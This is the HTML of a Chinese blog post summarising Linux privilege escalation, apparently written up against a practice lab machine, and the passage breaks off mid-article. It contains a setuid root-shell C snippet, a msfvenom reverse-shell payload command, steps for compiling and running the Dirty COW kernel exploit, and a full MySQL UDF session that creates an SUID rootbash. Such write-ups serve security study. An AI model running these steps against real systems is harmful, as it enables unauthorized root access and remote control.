@@ -1,0 +1,2209 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="Linux提权小结, 每天都要努力哇">
+    <meta name="description" content="分享者才是学习中最大的受益者！">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>Linux提权小结 | 每天都要努力哇</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 5.4.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="alternate" href="/atom.xml" title="每天都要努力哇" type="application/atom+xml">
+</head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">每天都要努力哇</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">每天都要努力哇</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/Redamancy404/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/Redamancy404/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/19.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">Linux提权小结</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/Linux%E6%8F%90%E6%9D%83%E5%B0%8F%E7%BB%93/">
+                                <span class="chip bg-color">Linux提权小结</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E6%8F%90%E6%9D%83/" class="post-category">
+                                提权
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2021-10-28
+                </div>
+                
+
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    9.6k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    41 分
+                </div>
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="Linux提权"><a href="#Linux提权" class="headerlink" title="Linux提权"></a>Linux提权</h1><h1 id="0x01-一般概念"><a href="#0x01-一般概念" class="headerlink" title="0x01 一般概念"></a>0x01 一般概念</h1><p>我们在 Linux 中特权升级的最终目标是获得root用户</p>
+<h2 id="用户、组、文件、目录"><a href="#用户、组、文件、目录" class="headerlink" title="用户、组、文件、目录"></a>用户、组、文件、目录</h2><h3 id="四者之间的关系"><a href="#四者之间的关系" class="headerlink" title="四者之间的关系"></a>四者之间的关系</h3><p>用户可以属于多个组。组可以具有多个用户。</p>
+<p>每个文件和目录都根据用户、组和”其他用户”（所有其他用户）来定义其权限。</p>
+<h3 id="用户"><a href="#用户" class="headerlink" title="用户"></a>用户</h3><p>用户帐户配置在/etc/passwd文件。</p>
+<p>用户密码哈希存储在/etc/shadow文件中。</p>
+<p>用户由整数用户 ID (UID)识别。</p>
+<p>root用户帐户是 Linux 中的一种特殊类型的帐户。它的 <strong>UID 为 0</strong>，系统允许此用户访问每个文件。</p>
+<h3 id="组"><a href="#组" class="headerlink" title="组"></a>组</h3><p>组配置在/etc/group文件中。</p>
+<p>用户有一个主要组，并且可以有multiple二级（或补充）组。</p>
+<p>默认情况下，用户的主要组与用户帐户的名称相同。</p>
+<h3 id="文件和目录"><a href="#文件和目录" class="headerlink" title="文件和目录"></a>文件和目录</h3><p>所有文件和目录都有一个所有者和一个组。</p>
+<p>权限以读取、编写和执行操作的方式定义。</p>
+<p>有三组权限，一组为所有者，一组为组，一组为所有”其他”用户</p>
+<p><strong>只有所有者才能更改权限</strong></p>
+<h2 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h2><h3 id="文件权限"><a href="#文件权限" class="headerlink" title="文件权限"></a>文件权限</h3><p>•  Read -设置后，可以读取文件内容。</p>
+<p>•  Write -设置后，文件 内容可以修改。</p>
+<p>•  Execute -设置后，文件可以执行 （即作为某种过程运行 ）。</p>
+<h3 id="目录权限"><a href="#目录权限" class="headerlink" title="目录权限"></a>目录权限</h3><p>•  Execute 设置时，目录可以输入。未经此许可，读取或写入权限均不起作用。</p>
+<p>•  Read -设置时，目录内容可以列出。</p>
+<p>•  Write -设置时，文件和子目录可以在目录中创建。</p>
+<h3 id="特殊权限"><a href="#特殊权限" class="headerlink" title="特殊权限"></a>特殊权限</h3><p>•  setuid (SUID) bit</p>
+<p>设置后，文件将使用文件所有者的权限执行。</p>
+<p>•  setgid (SGID) bit</p>
+<p>设置在文件上时，文件将使用文件组的权限执行。</p>
+<p>设置在目录上时，该目录内创建的文件将继承目录本身的组。</p>
+<h3 id="查看权限"><a href="#查看权限" class="headerlink" title="查看权限"></a>查看权限</h3><p>ls命令可以查看权限</p>
+<pre class="line-numbers language-none"><code class="language-none">ls -l /bin/date<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101641726.png" alt="image-20210701131222816"></p>
+<p>简单阐述一下： 前10个字符表示对文件设置的权限或目录。 </p>
+<p> 第一个字符只是表示类型，例如，文件<code>d</code>的<code>-</code>用于目录</p>
+<p>剩下的9个字符代表3组权限(所有者、组、其他)</p>
+<p>每组包含3个字符，表示读(r)、写(w)，可执行(x)</p>
+<p>SUID/SGID权限由中的<code>s</code>表示执行位置</p>
+<h2 id="真实、有效和保存的UID-GID"><a href="#真实、有效和保存的UID-GID" class="headerlink" title="真实、有效和保存的UID/GID"></a>真实、有效和保存的UID/GID</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>用户是由用户ID标识的。</p>
+<p>实际上，在Linux中，每个用户有3个用户id(real，effective，and saved)</p>
+<p>用户的真实ID是他们的真实身份<code>/etc/passwd</code>中定义的ID</p>
+<h3 id="继续深入"><a href="#继续深入" class="headerlink" title="继续深入"></a>继续深入</h3><p>用户的有效ID通常等于其真实ID，但是作为另一个用户执行一个进程时，有效ID被设置为该用户的真实身份。</p>
+<p>在大多数访问控制决策中，有效ID用于验证用户，</p>
+<p><code>whoami</code>等命令使用有效ID。</p>
+<p>最后，保存的ID用于确保<code>SUID</code>进程</p>
+<p>临时将用户的有效ID切换回其真实ID并返回，在不丢失原始有效ID的情况下</p>
+<h3 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h3><h4 id="真实有效的用户-组ID："><a href="#真实有效的用户-组ID：" class="headerlink" title="真实有效的用户/组ID："></a>真实有效的用户/组ID：</h4><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643133.png" alt="image-20210701132736765"></p>
+<h4 id="当前进程（即我们的shell）"><a href="#当前进程（即我们的shell）" class="headerlink" title="当前进程（即我们的shell）"></a>当前进程（即我们的shell）</h4><p>真实、有效、已保存和文件系统用户/组ID</p>
+<pre class="line-numbers language-none"><code class="language-none">cat /proc/$$/status | grep "[UG]id"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643135.png" alt="image-20210701132748704"></p>
+<h1 id="0x02-生成外壳"><a href="#0x02-生成外壳" class="headerlink" title="0x02 生成外壳"></a>0x02 生成外壳</h1><h2 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h2><p>目标：生成root外壳执行<code>/bin/sh</code> 或<code> /bin/bash</code></p>
+<h2 id="rootbash-SUID"><a href="#rootbash-SUID" class="headerlink" title="rootbash SUID"></a>rootbash SUID</h2><p>创建一个副本 </p>
+<p>在/bin/bash可执行文件中创建一个副本 ，通常将其重命名为rootbash，确保它归根用户所有</p>
+<p>并且设置了SUID位，只需执行rootbash文件就可以生成root的shell </p>
+<p>使用<code>-p</code>命令行选项，可以持久，方便我们多次利用rootbash</p>
+<h2 id="自定义可执行文件"><a href="#自定义可执行文件" class="headerlink" title="自定义可执行文件"></a>自定义可执行文件</h2><p> 可能存在某些根进程执行另一个root进程，你可以控制的过程。</p>
+<p>这时候</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+<span class="token function">setuid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/bash -p"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>上一串神秘的<code>.c</code>代码</p>
+<pre class="line-numbers language-none"><code class="language-none">gcc -o &lt;name&gt; &lt;filename.c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>编译后，将生成一个以root身份运行的Bash shell： </p>
+<h2 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h2><p>反向外壳 首先msfvenom，又叫毒液</p>
+<pre class="line-numbers language-none"><code class="language-none">msfvenom -p linux/x86/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f elf &gt; a001.elf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>接收shell的话 可以使用：nc或者msf中的监听(multi/handler)</p>
+<h2 id="本地反向外壳"><a href="#本地反向外壳" class="headerlink" title="本地反向外壳"></a>本地反向外壳</h2><p>使用一个工具是</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/mthbernardes/rsg">https://github.com/mthbernardes/rsg</a></p>
+<p>接收shell的话 可以使用：nc</p>
+<h1 id="0x03-工具"><a href="#0x03-工具" class="headerlink" title="0x03 工具"></a>0x03 工具</h1><h2 id="Linux-Smart-Enumeration"><a href="#Linux-Smart-Enumeration" class="headerlink" title="Linux Smart Enumeration"></a>Linux Smart Enumeration</h2><p>优点：靶机环境没有安装Python</p>
+<p><code>lse.sh</code>是一个 Bash 脚本，它有多个级别， 一步一步的扩展信息</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/diego-treitos/linux-smart-enumeration">https://github.com/diego-treitos/linux-smart-enumeration</a></p>
+<h2 id="LinEnum"><a href="#LinEnum" class="headerlink" title="LinEnum"></a>LinEnum</h2><p>LinEnum 是一个高级 Bash 脚本，它从目标系统中提取了大量有用的信息。<br>它可以复制文件并进行导出，同时可以搜索包含关键字的文件。<br><a target="_blank" rel="noopener" href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></p>
+<h2 id="其他工具"><a href="#其他工具" class="headerlink" title="其他工具"></a>其他工具</h2><p><a target="_blank" rel="noopener" href="https://github.com/linted/linuxprivchecker">https://github.com/linted/linuxprivchecker</a><br><a target="_blank" rel="noopener" href="https://github.com/AlessandroZ/BeRoot">https://github.com/AlessandroZ/BeRoot</a><br><a target="_blank" rel="noopener" href="http://pentestmonkey.net/tools/audit/unix-privesc-check">http://pentestmonkey.net/tools/audit/unix-privesc-check</a></p>
+<h1 id="0x04-内核漏洞"><a href="#0x04-内核漏洞" class="headerlink" title="0x04 内核漏洞"></a>0x04 内核漏洞</h1><h2 id="前言-2"><a href="#前言-2" class="headerlink" title="前言"></a>前言</h2><p>内核是任何操作系统的核心。<br>将其视为应用程序软件和实际计算机硬件之间的一层</p>
+<p>但是这边注意：<strong>没有在必要的情况下，不建议使用，因为会把目标机器搞的宕机</strong></p>
+<h2 id="查找内核漏洞"><a href="#查找内核漏洞" class="headerlink" title="查找内核漏洞"></a>查找内核漏洞</h2><ul>
+<li><p>1.查看内核版本(uname-a)</p>
+</li>
+<li><p>2.查找与之相匹配的漏洞（Google, ExploitDB, GitHub）。</p>
+</li>
+<li><p>3.编译并运行。</p>
+</li>
+</ul>
+<h2 id="实操-1"><a href="#实操-1" class="headerlink" title="实操"></a>实操</h2><h3 id="查看内核版本"><a href="#查看内核版本" class="headerlink" title="查看内核版本"></a>查看内核版本</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643136.png" alt="image-20210630111311891"></p>
+<h3 id="漏洞寻找"><a href="#漏洞寻找" class="headerlink" title="漏洞寻找"></a>漏洞寻找</h3><pre class="line-numbers language-none"><code class="language-none">searchsploit Linux debian 2.6.32<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643137.png" alt="image-20210630112011959"></p>
+<h3 id="安装漏洞建议器"><a href="#安装漏洞建议器" class="headerlink" title="安装漏洞建议器"></a>安装漏洞建议器</h3><p><a target="_blank" rel="noopener" href="https://github.com/jondonas/linux-exploit-suggester-2">https://github.com/jondonas/linux-exploit-suggester-2</a></p>
+<p>查看参数</p>
+<pre class="line-numbers language-none"><code class="language-none">[-h]帮助
+
+[-k]内核号
+
+[-d]打开漏洞利用下载菜单 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643138.png" alt="image-20210630112353863"></p>
+<pre class="line-numbers language-none"><code class="language-none">./linux-exploit-suggester-2.pl -k 2.6.32<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643139.png" alt="image-20210630112537357"></p>
+<p>可以看到有许多的Dirty COW的漏洞利用</p>
+<h3 id="CVE-2016-5195"><a href="#CVE-2016-5195" class="headerlink" title="CVE-2016-5195"></a>CVE-2016-5195</h3><p>这里参考：<a target="_blank" rel="noopener" href="https://gist.github.com/KrE80r/42f8629577db95782d5e4f609f437a54">https://gist.github.com/KrE80r/42f8629577db95782d5e4f609f437a54</a></p>
+<p>进行编译</p>
+<pre class="line-numbers language-none"><code class="language-none">gcc -pthread c0w.c -o c0w<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643140.png" alt="image-20210630120211277"></p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>python开始HTTP服务  机器通过wget下载<code>c0w.c</code></p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643141.png" alt="image-20210630113819038"></p>
+<p>进行编译执行</p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643142.png" alt="image-20210630120237500"></p>
+<h3 id="通过二进制文件"><a href="#通过二进制文件" class="headerlink" title="通过二进制文件"></a>通过二进制文件</h3><pre class="line-numbers language-none"><code class="language-none">/usr/bin/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="成功拿到root权限"><a href="#成功拿到root权限" class="headerlink" title="成功拿到root权限"></a>成功拿到root权限</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643143.png" alt="image-20210630120353418"></p>
+<h1 id="0x05-服务漏洞"><a href="#0x05-服务漏洞" class="headerlink" title="0x05 服务漏洞"></a>0x05 服务漏洞</h1><h2 id="前言-3"><a href="#前言-3" class="headerlink" title="前言"></a>前言</h2><p>服务只是在后台运行、接受输入或执行常规任务的程序。<br>如果弱势服务以root权限运行，则利用它们可导致命令执行<br>使用 Searchsploit、谷歌和 GitHub 可以找到服务漏洞，就像使用内核漏洞一样。</p>
+<h2 id="查找以root权限运行的服务"><a href="#查找以root权限运行的服务" class="headerlink" title="查找以root权限运行的服务"></a>查找以root权限运行的服务</h2><pre class="line-numbers language-none"><code class="language-none">ps aux | grep "^root"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="列举程序版本"><a href="#列举程序版本" class="headerlink" title="列举程序版本"></a>列举程序版本</h2><p>使用 命令行选项运行程序通常显示版本编号：</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;program&gt; --version
+&lt;program&gt; -v<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>类似 Debian 的系统上，dpkg 可以显示已安装的程序及其版本：</p>
+<pre class="line-numbers language-none"><code class="language-none">dpkg -l | grep &lt;program&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>在使用rpm的系统上</p>
+<pre class="line-numbers language-none"><code class="language-none">rpm –qa | grep &lt;program&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="实操-2"><a href="#实操-2" class="headerlink" title="实操"></a>实操</h2><h3 id="查看以root权限运行的服务"><a href="#查看以root权限运行的服务" class="headerlink" title="查看以root权限运行的服务"></a>查看以root权限运行的服务</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643144.png" alt="image-20210630114911170"></p>
+<p>看到mysql数据库 在以root权限运行</p>
+<h3 id="查看Mysqld的版本号"><a href="#查看Mysqld的版本号" class="headerlink" title="查看Mysqld的版本号"></a>查看Mysqld的版本号</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643145.png" alt="image-20210630115710381"></p>
+<p>Mysql数据库可以用过UDF提权进行实现</p>
+<h3 id="Mysql-UDF提权"><a href="#Mysql-UDF提权" class="headerlink" title="Mysql-UDF提权"></a>Mysql-UDF提权</h3><p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/1518">https://www.exploit-db.com/exploits/1518</a></p>
+<p>安装通过共享对象运行的用户定义功能  进行提权</p>
+<p>下载源码到靶机</p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643146.png" alt="image-20210630130745288"></p>
+<p>用法要进行一些修改</p>
+<p>这里要提一下 </p>
+<p>gcc编译中的选项</p>
+<pre class="line-numbers language-none"><code class="language-none">加上 fPIC 选项生成的动态库，显然是位置无关的，这样的代码本身就能被放到线性地址空间的任意位置，无需修改就能正确执行
+可以理解为放宽了编译通过的维度<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">user@debian:~$ gcc -g -c raptor_udf2.c -fPIC
+user@debian:~$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+user@debian:~$ mysql -u root -p
+Enter password: 
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 35
+Server version: 5.1.73-1+deb6u1 (Debian)
+
+Copyright (c) 2000, 2013, Oracle and/or its affiliates. All rights reserved.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql&gt; use mysql;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql&gt; create table foo(line blob);
+Query OK, 0 rows affected (0.01 sec)
+
+mysql&gt; insert into foo values(load_file('/home/user/raptor_udf2.so'));
+Query OK, 1 row affected (0.00 sec)
+
+mysql&gt; select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
+Query OK, 1 row affected (0.00 sec)
+
+mysql&gt; create function do_system returns integer soname 'raptor_udf2.so';
+Query OK, 0 rows affected (0.00 sec)
+
+mysql&gt; select do_system('cp /bin/bash /tmp/rootbash;chmod +s /tmp/rootbash');
++----------------------------------------------------------------+
+| do_system('cp /bin/bash /tmp/rootbash;chmod +s /tmp/rootbash') |
++----------------------------------------------------------------+
+|                                                              0 |
++----------------------------------------------------------------+
+1 row in set (0.01 sec)
+
+mysql&gt; exit
+Bye
